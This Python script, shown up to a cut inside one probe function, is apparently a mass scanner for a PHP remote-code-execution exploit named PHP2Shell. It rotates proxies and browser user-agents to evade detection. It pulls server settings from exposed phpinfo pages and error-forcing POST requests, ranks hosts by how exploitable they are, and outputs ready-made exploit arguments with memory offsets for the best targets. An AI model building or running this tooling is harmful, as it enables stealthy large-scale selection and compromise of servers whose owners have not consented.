#!/usr/bin/env python3
"""
php2shell-recon: bulk target scanner for CVE-2026-109618 / CVE-2026-109619.

Targets are scored and ranked for PHP2Shell exposure.
The exploit itself is not executed; targets are identified and classified.

Usage:
  python3 scan.py --input domains.txt --out results.jsonl
  python3 scan.py --input domains.txt --summary out.csv --concurrency 30 --random-ua
"""
from __future__ import annotations

import argparse
import asyncio
import csv
import datetime
import json
import math
import os
import random
import re
import signal
import sys
import time
from dataclasses import dataclass, field
from typing import Any, Awaitable, Optional
from urllib.parse import urlparse

# uvloop integration (Linux/macOS)
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    _HAVE_UVLOOP = True
except Exception:
    _HAVE_UVLOOP = False

try:
    import aiohttp
    from aiohttp import ClientSession, ClientTimeout, TCPConnector
    _HAVE_AIOHTTP = True
except ImportError:  # fallback: httpx
    try:
        import httpx
        _HAVE_HTTPX = True
        _HAVE_AIOHTTP = False
    except ImportError:
        sys.stderr.write("HATA: aiohttp veya httpx gerekli.\n")
        sys.stderr.write("pip install aiohttp   (veya)   pip install httpx\n")
        sys.exit(2)

try:
    import aiohttp_socks
    _HAVE_AIOHTTP_SOCKS = True
except ImportError:
    _HAVE_AIOHTTP_SOCKS = False

# ------------------------------------------------------------------ config & stealth
UA_DEFAULT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36")

UA_POOL: list[tuple[str, dict[str, str]]] = [
    # Chrome on Windows
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
     {"Sec-Ch-Ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"', "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"'}),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
     {"Sec-Ch-Ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"', "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"'}),
    # Edge on Windows
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
     {"Sec-Ch-Ua": '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"', "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"'}),
    # Chrome on macOS
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
     {"Sec-Ch-Ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"', "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"macOS"'}),
    # Safari on macOS
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
     {}),
    # Firefox on Windows
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
     {}),
    # Firefox on Linux
    ("Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
     {}),
    # Chrome on Linux
    ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
     {"Sec-Ch-Ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"', "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Linux"'}),
]

def get_browser_headers(ua: str | None = None, ch_hints: dict[str, str] | None = None) -> dict[str, str]:
    headers = {
        "User-Agent": ua or UA_DEFAULT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9,tr;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    }
    if ch_hints:
        headers.update(ch_hints)
    return headers

PHPINFO_PATHS = ["/phpinfo.php", "/info.php", "/test.php",
                 "/php_info.php", "/p.php", "/i.php",
                 "/.user.ini", "/composer.json",
                 "/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000"]

# Regexes
VER_RE = re.compile(rb"PHP[/\s]+(\d+)\.(\d+)\.(\d+)")
VER_RE_H = re.compile(rb"PHP\s+(\d+\.\d+\.\d+)")
BARE_VER_RE = re.compile(rb"^\s*(\d+)\.(\d+)\.(\d+)\s*$")
PHP_BODY_VER_RE = re.compile(
    rb"(?:PHP Version|PHP\/|X-Powered-By:\s*PHP\/|<b>PHP Version<\/b>\s*<\/td><td>)\s*(\d+\.\d+\.\d+)",
    re.IGNORECASE)
SERVER_BANNER_RE = re.compile(
    rb"(?:<address>|<hr>|<i>)\s*([A-Za-z0-9_.-]+/[0-9.]+(?:\s*\([^)]+\))?(?:\s+PHP/[0-9.]+)?(?:\s+OpenSSL/[0-9.]+)?)[\s<]",
    re.IGNORECASE)
PHP_ERROR_RE = re.compile(
    rb"(?:Fatal error|Parse error|Warning|Notice|Deprecated):\s+(?:.*?)\s+in\s+<b>(.*?)<\/b>\s+on\s+line\s+<b>(\d+)<\/b>",
    re.IGNORECASE)
PHP_ERROR_PLAIN_RE = re.compile(
    rb"(?:Fatal error|Parse error|Warning|Notice|Deprecated):\s+(?:.*?)\s+in\s+([^\s<]+\.php)\s+on\s+line\s+(\d+)",
    re.IGNORECASE)
MEM_RE = re.compile(rb"Allowed memory size of (\d+) bytes exhausted")
POST_RE = re.compile(rb"POST Content-Length of (\d+) bytes exceeds the limit of (\d+) bytes")
MAXVAR_RE = re.compile(rb"Input variables exceeded (\d+)")
SID_RE = re.compile(rb"PHPSESSID=([A-Za-z0-9]+)")
CDN_RE = re.compile(
    rb"(cloudflare|CF-RAY|akamai|sucuri|imperva|fastly|incapsula|bigip|f5)",
    re.IGNORECASE)
DISTRO_RE = re.compile(rb"\(([^()]{2,20})\)")
FASTCGI_ERR_RE = re.compile(rb"(?:Primary script unknown|File not found|FastCGI|php-fpm)", re.IGNORECASE)
LITESPEED_ERR_RE = re.compile(rb"(?:LiteSpeed Web Server|Proudly powered by LiteSpeed)", re.IGNORECASE)


def parse_ver(raw: bytes | str) -> Optional[tuple[int, int, int]]:
    blob = raw if isinstance(raw, bytes) else raw.encode("latin-1", "replace")
    for rx in (VER_RE, VER_RE_H, PHP_BODY_VER_RE, BARE_VER_RE):
        m = rx.search(blob)
        if m:
            parts = m.group(1).split(b"." if isinstance(m.group(1), bytes) else ".") if len(m.groups()) == 1 else None
            if parts and len(parts) == 3:
                try:
                    return (int(parts[0]), int(parts[1]), int(parts[2]))
                except ValueError:
                    pass
            elif len(m.groups()) >= 3:
                try:
                    return (int(m.group(1)), int(m.group(2)), int(m.group(3)))
                except ValueError:
                    pass
    return None


def affected(v: Optional[tuple[int, int, int]]) -> Optional[bool]:
    if v is None:
        return None
    maj, mi, pa = v
    if maj in (5, 6, 7):
        return True
    if maj == 8:
        if mi < 2:
            return True
        if mi == 2 and pa < 35:
            return True
        if mi == 3 and pa < 36:
            return True
        if mi == 4 and pa < 27:
            return True
        if mi == 5 and pa < 12:
            return True
    return False


@dataclass
class Rec:
    host: str
    url_used: str = ""
    scheme: str = ""
    final_url: str = ""
    status_code: Optional[int] = None
    server: Optional[str] = None
    server_distro: Optional[str] = None
    php_version: Optional[str] = None
    affected_version: Optional[bool] = None
    sapi: Optional[str] = None
    sapi_confidence: Optional[str] = None
    display_errors: Optional[bool] = None
    memory_limit: Optional[int] = None
    post_max_size: Optional[int] = None
    max_input_vars: Optional[int] = None
    session_upload_progress: Optional[bool] = None
    session_use_cookies: Optional[bool] = None
    session_use_strict_mode: Optional[bool] = None
    phpinfo_path: Optional[str] = None
    cdn: Optional[bool] = None
    exploitability_score: int = 0
    verdict: str = "UNKNOWN"
    notes: list = field(default_factory=list)
    suggested_exploit_args: dict = field(default_factory=dict)
    probed_at: str = ""
    duration_ms: int = 0
    error: Optional[str] = None

    def to_dict(self) -> dict:
        return {
            "host": self.host, "url_used": self.url_used, "scheme": self.scheme,
            "final_url": self.final_url, "status_code": self.status_code,
            "server": self.server, "server_distro": self.server_distro,
            "php_version": self.php_version,
            "affected_version": self.affected_version,
            "sapi": self.sapi, "sapi_confidence": self.sapi_confidence,
            "display_errors": self.display_errors,
            "memory_limit": self.memory_limit,
            "post_max_size": self.post_max_size,
            "max_input_vars": self.max_input_vars,
            "session_upload_progress": self.session_upload_progress,
            "session_use_cookies": self.session_use_cookies,
            "session_use_strict_mode": self.session_use_strict_mode,
            "phpinfo_path": self.phpinfo_path,
            "cdn": self.cdn,
            "exploitability_score": self.exploitability_score,
            "verdict": self.verdict, "notes": self.notes,
            "suggested_exploit_args": self.suggested_exploit_args,
            "probed_at": self.probed_at, "duration_ms": self.duration_ms,
            "error": self.error,
        }


def score(rec: Rec) -> None:
    s = 0
    if rec.affected_version is True:
        s += 25
    elif rec.affected_version is None:
        s += 10
    if rec.sapi == "mod_php":
        s += 20 if rec.sapi_confidence in ("high", None) else 10
    if rec.display_errors is True:
        s += 15
    if rec.session_upload_progress is True:
        s += 10
    if rec.session_use_strict_mode is False:
        s += 10
    if (rec.memory_limit and rec.post_max_size
            and 0 < rec.memory_limit < 12 * 1048576
            and rec.post_max_size >= 12 * 1048576):
        s += 10
    if rec.cdn is True:
        s -= 15
    if "SCHEME_MISMATCH" in rec.notes:
        s -= 10
    rec.exploitability_score = max(0, min(100, s))

    # verdict
    if rec.php_version is None and rec.affected_version is None:
        rec.verdict = "UNKNOWN"
    elif rec.affected_version is True and rec.sapi == "fpm":
        rec.verdict = "YELLOW_FPM"
    elif (rec.affected_version is True and rec.sapi == "mod_php"
          and rec.display_errors is True
          and rec.session_upload_progress is True
          and rec.session_use_strict_mode is False
          and rec.post_max_size is not None and rec.post_max_size >= 12 * 1048576
          and rec.memory_limit is not None and rec.memory_limit < 12 * 1048576
          and rec.exploitability_score >= 75):
        rec.verdict = "GREEN"
    elif rec.affected_version is True and rec.sapi == "mod_php" \
            and rec.display_errors is True:
        rec.verdict = "YELLOW"
    elif rec.affected_version is False or rec.display_errors is False \
            or rec.session_upload_progress is False:
        rec.verdict = "RED"
    else:
        rec.verdict = "UNKNOWN"


def suggest_args(rec: Rec) -> dict:
    if rec.verdict != "GREEN":
        return {}
    ml = rec.memory_limit or 8 * 1048576
    pms = rec.post_max_size or 12 * 1048576
    huge_mb = max(4, min(14, int((ml // 1048576) + 2)))
    huge_mb = min(huge_mb, max(4, pms // 1048576 - 1))
    if rec.post_max_size and rec.post_max_size < 12 * 1048576:
        rec.notes.append("NEEDS_AMPLIFICATION")
    return {
        "-u": f"{rec.url_used}",
        "--huge-mb": huge_mb,
        "--profile": "bookworm",
        "--zif-offset": "0x465370",
        "--dtor-offset": "0x65eb60",
        "--retries": 20,
        "--fetch": "/x",
    }


# ------------------------------------------------------------------ Proxy Rotator
class ProxyRotator:
    def __init__(self, single_proxy: str | None, proxy_file: str | None):
        self.proxies: list[str] = []
        if single_proxy:
            self.proxies.append(single_proxy.strip())
        if proxy_file and os.path.exists(proxy_file):
            with open(proxy_file, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    p = line.strip()
                    if p and not p.startswith("#"):
                        if not p.startswith(("http://", "https://", "socks5://", "socks5h://", "socks4://")):
                            p = f"http://{p}"
                        self.proxies.append(p)
        self._pos = 0

    def get_proxy(self) -> str | None:
        if not self.proxies:
            return None
        p = self.proxies[self._pos % len(self.proxies)]
        self._pos += 1
        return p


# ------------------------------------------------------------------ HTTP client
class HTTP:
    """aiohttp-based client with connection pooling, DNS cache and proxy rotation."""

    def __init__(self, args):
        self.args = args
        self._sessions: dict[str, Any] = {}
        self._lock = asyncio.Lock()
        self._rate_guard = asyncio.Lock()
        self._rate_locks: dict[str, asyncio.Lock] = {}
        self._last_request: dict[str, float] = {}
        self._insecure = args.insecure
        self._timeout_conn = 10
        self._timeout_read = 15
        self.proxy_rotator = ProxyRotator(args.proxy, getattr(args, "proxy_file", None))

        # Async DNS caching
        self._resolver = None
        try:
            import aiodns
            self._resolver = aiohttp.AsyncResolver()
        except Exception:
            pass

    async def _throttle(self, host: str) -> None:
        if self.args.rate <= 0:
            return
        async with self._rate_guard:
            lock = self._rate_locks.setdefault(host, asyncio.Lock())
        async with lock:
            interval = 1.0 / self.args.rate
            now = time.monotonic()
            wait_for = self._last_request.get(host, 0.0) + interval - now
            if wait_for > 0:
                await asyncio.sleep(wait_for)
            self._last_request[host] = time.monotonic()

    def _attempts(self) -> int:
        return max(1, self.args.retries + 1)

    def _get_ua_and_headers(self) -> tuple[str, dict[str, str]]:
        if self.args.ua:
            return self.args.ua, get_browser_headers(self.args.ua)
        if getattr(self.args, "random_ua", True):
            ua_str, hints = random.choice(UA_POOL)
            return ua_str, get_browser_headers(ua_str, hints)
        return UA_DEFAULT, get_browser_headers(UA_DEFAULT)

    async def _get_session(self, host: str) -> Any:
        async with self._lock:
            if host not in self._sessions:
                ua_str, default_hdrs = self._get_ua_and_headers()
                if _HAVE_AIOHTTP:
                    jar = aiohttp.CookieJar(unsafe=True)
                    sslctx = None
                    if self._insecure:
                        import ssl as _ssl
                        sslctx = _ssl.create_default_context()
                        sslctx.check_hostname = False
                        sslctx.verify_mode = _ssl.CERT_NONE
                    
                    # High performance connection pooling + async DNS cache
                    connector = TCPConnector(
                        ssl=sslctx,
                        use_dns_cache=True,
                        ttl_dns_cache=300,
                        limit=max(100, self.args.concurrency * 2),
                        limit_per_host=10,
                        enable_cleanup_closed=True,
                        keepalive_timeout=30.0,
                        resolver=self._resolver,
                    )
                    self._sessions[host] = ClientSession(
                        cookie_jar=jar,
                        timeout=ClientTimeout(
                            connect=self._timeout_conn,
                            total=60 if self.args.timeout > 20 else self.args.timeout),
                        connector=connector,
                        headers=default_hdrs,
                    )
                else:
                    self._sessions[host] = httpx.AsyncClient(
                        headers=default_hdrs,
                        verify=not self._insecure,
                        timeout=httpx.Timeout(self.args.timeout),
                        proxy=self.proxy_rotator.get_proxy(),
                    )
            return self._sessions[host]

    async def close(self, host: str) -> None:
        async with self._lock:
            s = self._sessions.pop(host, None)
        if s is None:
            return
        try:
            if _HAVE_AIOHTTP:
                await s.close()
            else:
                await s.aclose()
        except Exception:
            pass

    async def get(self, url: str, extra_headers: dict | None = None) -> dict:
        host = urlparse(url).hostname or ""
        out = {"ok": False, "status": None, "headers": {}, "body": b"",
               "final_url": url, "error": None}
        cur_proxy = self.proxy_rotator.get_proxy()
        for attempt in range(self._attempts()):
            try:
                await self._throttle(host)
                s = await self._get_session(host)
                if _HAVE_AIOHTTP:
                    request_args = {
                        "allow_redirects": True,
                        "max_redirects": 5,
                        "read_bufsize": self.args.max_body,
                    }
                    if cur_proxy:
                        request_args["proxy"] = cur_proxy
                    if extra_headers:
                        request_args["headers"] = extra_headers
                    async with s.get(url, **request_args) as resp:
                        out["status"] = resp.status
                        out["final_url"] = str(resp.url)
                        out["headers"] = {k.lower(): v for k, v in resp.headers.items()}
                        body = await resp.read()
                        out["body"] = body[:self.args.max_body]
                else:
                    hdrs = extra_headers or {}
                    resp = await s.get(url, follow_redirects=True, headers=hdrs)
                    out["status"] = resp.status_code
                    out["final_url"] = str(resp.url)
                    out["headers"] = {k.lower(): v for k, v in resp.headers.items()}
                    out["body"] = resp.content[:self.args.max_body]
                out["ok"] = True
                return out
            except Exception as e:
                out["error"] = repr(e)
                if attempt + 1 < self._attempts():
                    await asyncio.sleep(min(2.0, 0.25 * (attempt + 1)))
        return out

    async def post(self, url: str, body: bytes | None = None,
                   headers: dict | None = None,
                   raw_body: bool = False,
                   long_body: bool = False) -> dict:
        host = urlparse(url).hostname or ""
        out = {"ok": False, "status": None, "headers": {}, "body": b"",
               "error": None, "final_url": url}
        cur_proxy = self.proxy_rotator.get_proxy()
        for attempt in range(self._attempts()):
            try:
                await self._throttle(host)
                s = await self._get_session(host)
                hdrs = {"Connection": "close"}
                hdrs.update(headers or {})
                if _HAVE_AIOHTTP:
                    post_args = {
                        "data": b"" if raw_body else (body if body is not None else b""),
                        "headers": hdrs,
                        "timeout": ClientTimeout(
                            total=60 if long_body else self.args.timeout),
                        "allow_redirects": True,
                        "max_redirects": 5,
                    }
                    if cur_proxy:
                        post_args["proxy"] = cur_proxy
                    async with s.post(url, **post_args) as resp:
                        out["status"] = resp.status
                        out["final_url"] = str(resp.url)
                        out["headers"] = {k.lower(): v for k, v in resp.headers.items()}
                        out["body"] = (await resp.read())[:self.args.max_body]
                else:
                    async with s.stream("POST", url, content=body or b"",
                                        headers=hdrs,
                                        follow_redirects=True) as resp:
                        out["status"] = resp.status_code
                        out["final_url"] = str(resp.url)
                        out["headers"] = {k.lower(): v
                                          for k, v in resp.headers.items()}
                        data = b""
                        async for chunk in resp.aiter_bytes():
                            data += chunk
                            if len(data) > self.args.max_body:
                                break
                        out["body"] = data[:self.args.max_body]
                out["ok"] = True
                return out
            except Exception as e:
                out["error"] = repr(e)
                if attempt + 1 < self._attempts():
                    await asyncio.sleep(min(2.0, 0.25 * (attempt + 1)))
        return out

    async def post_content_length_mismatch(self, url: str,
                                           declared: int) -> dict:
        host = urlparse(url).hostname or ""
        out = {"ok": False, "status": None, "headers": {}, "body": b"",
               "error": None, "final_url": url}
        try:
            await self._throttle(host)
            if _HAVE_AIOHTTP:
                import socket as _s
                u = urlparse(url)
                port = u.port or (443 if u.scheme == "https" else 80)
                ip = socket_get_ip(u.hostname or "")
                sock = _s.create_connection((ip, port), timeout=self._timeout_conn)
                if u.scheme == "https":
                    import ssl as _ssl
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=u.hostname)
                path = u.path or "/"
                if u.query:
                    path += "?" + u.query
                ua_str, _ = self._get_ua_and_headers()
                req = (f"POST {path} HTTP/1.1\r\n"
                       f"Host: {u.hostname}\r\n"
                       f"User-Agent: {ua_str}\r\n"
                       f"Content-Length: {declared}\r\n"
                       f"Content-Type: application/x-www-form-urlencoded\r\n"
                       f"Connection: close\r\n\r\n").encode("latin-1")
                sock.sendall(req + b"a=" + b"x" * 2048)
                sock.shutdown(_s.SHUT_WR)
                sock.settimeout(15)
                data = bytearray()
                while True:
                    try:
                        part = sock.recv(65536)
                    except Exception:
                        break
                    if not part:
                        break
                    data += part
                    if len(data) > self.args.max_body:
                        break
                sock.close()
                raw = bytes(data)
                hend = raw.find(b"\r\n\r\n")
                first = raw.split(b"\r\n", 1)[0]
                out["status"] = int(first.split(b" ", 2)[1]) if b"HTTP/" in first else None
                hb = raw[:hend] if hend > 0 else raw
                for ln in hb.split(b"\r\n")[1:]:
                    if b":" in ln:
                        k, v = ln.split(b":", 1)
                        out["headers"][k.strip().lower().decode("latin-1", "replace")] = \
                            v.strip().decode("latin-1", "replace")
                out["body"] = (raw[hend + 4:] if hend > 0 else b"")[:self.args.max_body]
            else:
                s = await self._get_session(host)
                hdrs = {"Content-Length": str(declared), "Connection": "close"}
                try:
                    async with s.post(url, data=b"a=" + b"x" * 2048,
                                      headers=hdrs,
                                      timeout=httpx.Timeout(30),
                                      follow_redirects=True) as resp:
                        out["status"] = resp.status_code
                        out["headers"] = {k.lower(): v for k, v in resp.headers.items()}
                        out["body"] = resp.content[:self.args.max_body]
                except Exception as e:
                    out["error"] = repr(e)
            out["ok"] = True
            return out
        except Exception as e:
            out["error"] = repr(e)
            return out


def socket_get_ip(host: str) -> str:
    import socket as _s
    try:
        return _s.getaddrinfo(host, None, _s.AF_INET)[0][4][0]
    except Exception:
        return host


# ------------------------------------------------------------------ phpinfo
PHPINFO_KEYS = {
    "php_version": (rb"PHP Version", rb"PHP Version"),
    "server_api": (rb"Server API", rb"Server API"),
    "memory_limit": (rb"memory_limit", rb"Memory limit"),
    "post_max_size": (rb"post_max_size", rb"Post max size"),
    "display_errors": (rb"display_errors", rb"Display errors"),
    "max_input_vars": (rb"max_input_vars", rb"Max input variables"),
    "session_upload_progress": (rb"session.upload_progress.enabled",
                                rb"Upload progress enabled"),
    "session_use_cookies": (rb"session.use_cookies", rb"Use cookies"),
    "session_use_strict_mode": (rb"session.use_strict_mode",
                                rb"Strict mode"),
    "mpm_prefork": (rb"mpm_prefork", rb"Prefork"),
}


def parse_phpinfo(body: bytes) -> dict:
    out: dict[str, Any] = {}
    for key, (rx_a, rx_b) in PHPINFO_KEYS.items():
        pat = re.compile(
            (rx_a.decode("latin-1") + r".*?<[^>]+>\s*([^\s<]+)")
            .encode("latin-1"),
            re.DOTALL | re.IGNORECASE)
        m = pat.search(body)
        if m:
            out[key] = m.group(1).decode("latin-1", "replace")
    v = parse_ver(body)
    if v:
        out["php_version"] = ".".join(map(str, v))
    for k in ("memory_limit", "post_max_size"):
        val = out.get(k)
        if val:
            val = val.strip().upper()
            if val.endswith("M"):
                try:
                    out[k] = int(float(val[:-1]) * 1048576)
                except ValueError:
                    out[k] = None
            elif val.endswith("K"):
                try:
                    out[k] = int(float(val[:-1]) * 1024)
                except ValueError:
                    out[k] = None
            elif val in ("-1", "UNLIMITED"):
                out[k] = -1
            else:
                try:
                    out[k] = int(val)
                except ValueError:
                    out[k] = None
    val = out.get("display_errors")
    if val:
        out["display_errors"] = val.upper() in ("ON", "1")
    val = out.get("session_upload_progress")
    if val:
        out["session_upload_progress"] = val.upper() in ("ON", "1")
    val = out.get("session_use_cookies")
    if val:
        out["session_use_cookies"] = val.upper() in ("ON", "1")
    val = out.get("session_use_strict_mode")
    if val:
        out["session_use_strict_mode"] = val.upper() in ("ON", "1")
    return out


# ------------------------------------------------------------------ Probes
class Probes:
    def __init__(self, http: HTTP, args):
        self.http = http
        self.args = args
        self.budget_used = 0
        self.budget = args.probe_budget

    def spend(self, n: int = 1) -> bool:
        if self.budget_used + n > self.budget:
            return False
        self.budget_used += n
        return True

    async def fingerprint(self, url: str, rec: Rec) -> bool:
        """Extract headers, error signatures, phpinfo, version and SAPI."""
        out = await self.http.get(url)
        if not out["ok"]:
            rec.error = out["error"]
            return False
        rec.status_code = out["status"]
        rec.final_url = out["final_url"]
        rec.url_used = url
        h = out["headers"]
        rec.server = h.get("server")

        # Server distro signature
        if rec.server:
            m = DISTRO_RE.search(rec.server.encode("latin-1", "replace"))
            if m:
                rec.server_distro = m.group(1).decode("latin-1", "replace")

        # CDN / WAF detection
        cdn_blob = (rec.server or "").encode("latin-1", "replace")
        for k in ("cf-ray", "x-sucuri-id", "x-akamai-serial", "server", "x-cdn"):
            v = h.get(k, "")
            if v:
                cdn_blob += v.encode("latin-1", "replace")
        rec.cdn = bool(CDN_RE.search(cdn_blob))
        if rec.cdn:
            rec.notes.append("CDN/WAF behind")

        # Enhanced version extraction from headers & error banners
        ver_raw = h.get("x-powered-by", "")
        if not ver_raw:
            ver_raw = h.get("x-cf-powered-by", "")
        if not ver_raw:
            ver_raw = (rec.server or "")
        v = parse_ver(ver_raw)
        if v:
            rec.php_version = ".".join(map(str, v))

        # Check response body for address banners / error page disclosures (404/405/413/500/etc.)
        if not rec.php_version and out["body"]:
            addr_m = SERVER_BANNER_RE.search(out["body"])
            if addr_m:
                banner = addr_m.group(1).decode("latin-1", "replace").strip()
                if not rec.server:
                    rec.server = banner
                if "PHP/" in banner:
                    v_banner = parse_ver(banner)
                    if v_banner:
                        rec.php_version = ".".join(map(str, v_banner))
                        rec.notes.append("Version from server error banner")

        # Check for PHP error path leaks
        if out["body"]:
            err_m = PHP_ERROR_RE.search(out["body"]) or PHP_ERROR_PLAIN_RE.search(out["body"])
            if err_m:
                leaked_path = err_m.group(1).decode("latin-1", "replace")
                rec.display_errors = True
                rec.notes.append(f"LEAKED_PATH:{leaked_path}")

        # Set-Cookie: PHPSESSID -> PHP + active session
        setc = h.get("set-cookie", "")
        has_sid = bool(SID_RE.search(setc.encode("latin-1", "replace")))

        # Try phpinfo paths if version is not yet resolved
        if rec.php_version is None:
            for p in PHPINFO_PATHS:
                if not self.spend(1):
                    break
                u = url.rstrip("/") + p
                if p.startswith("/?="):
                    u = url + p if "?" not in url else url + "&" + p.lstrip("/?")
                pi = await self.http.get(u)
                if not pi["ok"] or pi["status"] != 200:
                    continue
                parsed = parse_phpinfo(pi["body"])
                if parsed:
                    rec.phpinfo_path = p
                    if "php_version" in parsed:
                        rec.php_version = parsed["php_version"]
                    rec._phpinfo = parsed
                    break

        if rec.php_version:
            v = parse_ver(rec.php_version)
            rec.affected_version = affected(v)
        elif rec.status_code is not None:
            rec.affected_version = None

        # SAPI heuristics: headers, phpinfo, FastCGI headers, LiteSpeed, etc.
        sapi_from_info = None
        if hasattr(rec, "_phpinfo"):
            sa = rec._phpinfo.get("server_api", "")
            if "apache2handler" in sa.lower() or "apache 2.0 handler" in sa.lower():
                sapi_from_info = "mod_php"
            elif "fpm" in sa.lower():
                sapi_from_info = "fpm"
            elif "litespeed" in sa.lower():
                sapi_from_info = "litespeed"
            elif "frankenphp" in sa.lower():
                sapi_from_info = "frankenphp"
            elif "cgi" in sa.lower():
                sapi_from_info = "cgi"

        if sapi_from_info:
            rec.sapi = sapi_from_info
            rec.sapi_confidence = "high"
        else:
            srv = (rec.server or "").lower()
            if "x-accel-buffering" in h or "x-fastcgi-cache" in h:
                rec.sapi = "fpm"
                rec.sapi_confidence = "medium"
            elif FASTCGI_ERR_RE.search(out["body"]):
                rec.sapi = "fpm"
                rec.sapi_confidence = "medium"
            elif LITESPEED_ERR_RE.search(out["body"]) or "litespeed" in srv:
                rec.sapi = "litespeed"
                rec.sapi_confidence = "high" if "litespeed" in srv else "medium"
            elif "frankenphp" in srv:
                rec.sapi = "frankenphp"
                rec.sapi_confidence = "high"
            elif "nginx" in srv:
                rec.sapi = "fpm"
                rec.sapi_confidence = "medium"
            elif "apache" in srv:
                rec.sapi = "mod_php"
                rec.sapi_confidence = "low"
            elif "caddy" in srv or "openresty" in srv:
                rec.sapi = "fpm"
                rec.sapi_confidence = "low"
            else:
                rec.sapi = None
                rec.sapi_confidence = "low"

        # Optional probe for non-existent PHP endpoint to force 404/error disclosing server
        if getattr(self.args, "probe_error_page", False) and rec.php_version is None:
            if self.spend(1):
                err_u = url.rstrip("/") + "/_p2_nonexistent_probe_404.php"
                err_resp = await self.http.get(err_u)
                if err_resp["ok"] and err_resp["body"]:
                    v_err = parse_ver(err_resp["body"])
                    if v_err:
                        rec.php_version = ".".join(map(str, v_err))
                        rec.notes.append("Version from error probe")
                        rec.affected_version = affected(v_err)

        # HTTP/HTTPS consistency
        if url.startswith("https://"):
            hp = url.replace("https://", "http://", 1)
            if self.spend(1):
                rh = await self.http.get(hp)
                if rh["ok"] and rh["status"] in (200, 301, 302) \
                        and (rec.status_code not in (200,)):
                    rec.notes.append("SCHEME_MISMATCH")
        return rec.phpinfo_path is not None

    async def p1_display_postmax(self, url: str, rec: Rec) -> None:
        if not self.spend(1):
            return
        out = await self.http.post_content_length_mismatch(url, 1073741824)
        if not out["ok"]:
            return
        body = out["body"]
        m = POST_RE.search(body)
        if m:
            rec.post_max_size = int(m.group(2))
            rec.display_errors = True
            rec.notes.append("P1: post_max_size from warning")

    async def p2_memory_limit(self, url: str, rec: Rec) -> None:
        if rec.affected_version is not True:
            return
        if rec.sapi != "mod_php":
            return
        pms = rec.post_max_size or (16 * 1048576)
        bodies = []
        for mb in (1, 2, 4, 6):
            size = mb * 1048576
            if size < pms:
                bodies.append((mb, size))
        if not bodies:
            return
        for mb, size in reversed(bodies):
            if not self.spend(1):
                break
            n_fields = max(100, size // 1024)
            parts = [f"field_{i}={i}" for i in range(min(n_fields, 5000))]
            body = ("&".join(parts)).encode("latin-1", "replace")
            if len(body) > pms:
                body = body[:pms - 1024]
            out = await self.http.post(
                url, body=body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                long_body=True)
            if not out["ok"]:
                continue
            m = MEM_RE.search(out["body"])
            if m:
                rec.memory_limit = int(m.group(1))
                rec.notes.append("P2: memory_limit from fatal")
                return
        if bodies:
            rec.memory_limit = bodies[-1][1] * 4
            rec.notes.append("P2: memory_limit >= tried*4 (no fatal)")

    async def p3_max_input_vars(self, url: str, rec: Rec) -> None:
        if not self.spend(1):
            return
        parts = [f"v{i}=x" for i in range(1001)]
        body = ("&".join(parts)).encode("latin-1", "replace")
        out = await self.http.post(
            url, body=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"})
        if not out["ok"]:
            return
        m = MAXVAR_RE.search(out["body"])
        if m:
            rec.max_input_vars = int(m.group(1))
            rec.display_errors = True
            rec.notes.append("P3: max_input_vars from warning")
        elif rec.display_errors is None:
            rec.display_errors = False

    async def p4_upload_progress(self, url: str, rec: Rec) -> None:
        if rec.phpinfo_path:
            return
        if not self.spend(1):
            return
        boundary = "----php2shellprobe"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
            f"pp2shellprobe\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; '
            f'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npwn\r\n'
            f"--{boundary}\r\n"
